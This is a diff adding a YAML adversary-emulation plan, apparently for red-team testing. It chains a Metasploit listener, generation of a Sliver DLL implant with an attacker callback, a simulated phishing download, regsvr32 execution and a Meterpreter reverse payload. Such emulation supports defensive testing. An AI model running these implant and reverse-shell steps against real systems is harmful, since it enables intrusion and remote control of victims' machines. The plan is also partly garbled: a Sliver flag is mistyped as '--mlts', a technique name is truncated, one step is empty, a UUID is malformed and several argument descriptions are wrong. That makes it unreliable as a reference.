@@ -1,0 +1,230 @@
+emulation_plan_details:
+  adversary_name: test
+  creation_time: 2025-04-25 22:12:13 UTC+0000
+attack_action_sequence:
+  - uuid: 08f66886-0e96-455b-be31-b0af37db8e23
+    name: Set a universal payload handler using MSF exploit/multi/handler module
+    id:
+      - T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+      - Command and Control
+    technique:
+      - Windows Command Shell
+      - Ingress Tool Transfer
+      - Non-Standard Por
+    description: |
+      In Metasploit, the exploit/multi/handler module is essentially a universal payload handler.
+      Unlike most exploit modules in Metasploit that target specific vulnerabilities, multi/handler does not exploit a particular service or software.
+      Instead, its main purpose is to listen for incoming connections from payloads that you have already delivered to a target by some other means.
+    execution:
+      executor: Metasploit Executor
+      command: |
+        exploit_and_execute_payload(target = None,
+                                    exploit_module_name = "exploit/multi/handler",
+                                    payload_module_name = "#{payload_name}",
+                                    listening_host = "#{LHOST}",
+                                    listening_port = "#{LPORT}"):
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      payload_name:
+        default:
+        description: payload type set by msf
+        type:
+  - uuid: bb2176c4-855e-4b52-ab03-5fe2e58d8129
+    name: Build DLL Sliver implant
+    id:
+      - T1071.001
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      The command is used in the Sliver C2 (Command and Control) framework to generate a payload designed for remote access to a target machine.
+    execution:
+      executor: Sliver Console
+      command: |
+        sliver > generate --mlts #{LHOST}:#{LPORT} --os windows --arch 64bit --format shared --save #{SAVE_PATH}
+        sliver > mlts --lport #{LPORT}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      SAVE_PATH:
+        default:
+        description: Saved path of the generated payload
+        type:
+  - uuid: 7480189e-1a4b-45f5-b225-c102915f7262
+    name: Simulate the victim download a file on its machine
+    id:
+      - T1566.002
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Initial Access
+    technique:
+      - 'Phishing: Spearphishing Link'
+    description: This step simulates the victim accidentally downloads a malicious
+      file by clicking a link.
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On attacker's machine)
+        python -m http.server
+
+        (On victim's machine)
+        1. Open #{LHOST}:#{LPORT} in the browser
+        2. Navigate to the path of the file on the attacker's machine
+        3. Download the file to #{PATH}
+    arguments:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: listening port of the attacter machine
+        type:
+      SAVE_PATH:
+        default:
+        description: Saved path of the downloaded payload
+        type:
+  - uuid: 5b852063-ca39-4600-b246-024897721010
+    name: Simulate the victim execute a DLL file on its machine
+    id:
+      - T1204.002
+    source: Manual
+    supported_platforms:
+      - windows
+    tactics:
+      - Execution
+    technique:
+      - 'User Execution: Malicious File'
+    description: This step simulates the victim executes a DLL file on its machine.
+    execution:
+      executor: Human
+      command: |
+        (This step needs human interaction and (temporarily) cannot be executed automatically)
+        (On victim's machine, use PowerShell or Command Prompt)
+        regsvr32 #{DLL_PATH}
+    arguments:
+      DLL_PATH:
+        default:
+        description: Saved path of the DLL file
+        type:
+  - uuid: 1f401bbe-de24-41d2-8e34-d026e25bfb94
+    name: Execute a Sliver Implant Payload
+    id:
+      - T1071.001
+    source: Sliver
+    supported_platforms:
+      - windows
+    tactics:
+      - Command and Control
+    technique:
+      - Application Layer Protocol - Web Protocols
+    description: |
+      Executing a Sliver implant payload will establish a Sliver session.
+    execution:
+      executor: None
+      command: |
+        None
+    arguments:
+  - uuid: 861580a4-aad7-4269-94ea-43f3f775423d
+    name: Metasploit Payload Execution using Sliver
+    id:
+      - T1203
+    source: Sliver
+    supported_platforms:
+      - windows
+      - linux
+      - macos
+    tactics:
+      - Execution
+    technique:
+      - Exploitation for Client Execution
+    description: The command is used within a Sliver session to execute a Metasploit
+      payload in the current process. It allows users to specify various options such
+      as the encoder type, number of encoding iterations, listening host and port,
+      payload type, and command timeout. By default, it uses the "meterpreter_reverse_https"
+      payload, listens on port 4444, and has a timeout of 60 seconds. This command
+      is typically used for penetration testing and security assessments to deploy
+      payloads on target systems.
+    execution:
+      executor: Sliver Executor
+      command: |
+        msf(#{SessionID}, #{Payload}, #{LHOST}, #{LPORT})
+    arguments:
+      SessionID:
+        default:
+        description: The session ID of the active Sliver connection.
+        type:
+      Payload:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LHOST:
+        default:
+        description: IP address of the attacker machine
+        type:
+      LPORT:
+        default:
+        description: IP address of the attacker machine
+        type:
+  - uuid: b9fe1645-bc7e-4743-86dc-7dbee3431e16
+    name: Execute Payload windows-meterpreter_reverse_http
+    id:
+      - 
+    source: Metasploit
+    supported_platforms:
+      - 
+    tactics:
+      - 
+    technique:
+    description:
+    execution:
+    arguments:
+      - target
+      - sessionID
+  - uuid: 9f3a8b7c-2c41-4a39-c8df-1e9b3a7c2e1
+    name: Get Active Desktop
+    id:
+      - T1018
+    source: Metasploit
+    supported_platforms:
+      - windows
+    tactics:
+      - Discovery
+    technique: |
+      Remote System Discovery  
+    description: The `getdesktop` command displays the current active desktop session
+      information.
+    execution:
+      executor: Meterpreter Executor
+      command: getdesktop (#{meterpreter_sessionid})
+    arguments:
+      meterpreter_sessionid:
+        description: The Meterpreter session ID of the active Metasploit connection
+testbed_requirement:
+  OS: []
+  CVE: []
